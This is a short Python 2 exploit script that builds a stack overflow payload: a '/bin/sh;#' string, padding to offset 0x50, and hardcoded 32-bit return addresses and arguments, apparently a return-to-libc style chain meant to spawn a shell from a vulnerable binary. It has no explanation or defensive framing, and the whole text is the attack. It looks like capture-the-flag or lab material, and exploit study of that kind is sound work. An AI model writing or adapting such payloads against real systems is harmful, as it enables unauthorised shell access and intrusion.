#!/usr/bin/env python

offset = 0x50
cmd = "/bin/sh;#"
junk = "J" * (offset - len(cmd))
gadg_ret = "\x17\x86\x04\x08"
ret1= "\xb0\xff\xec\xb7"
ret2 = "\xc0\x60\xec\xb7"
arg1 = "\x6c\xf7\xff\xbf"
arg2 = "\xf0\xf1\xff\xff"

payload = cmd + junk + gadg_ret + ret1 + ret2 + arg1 + arg2

print payload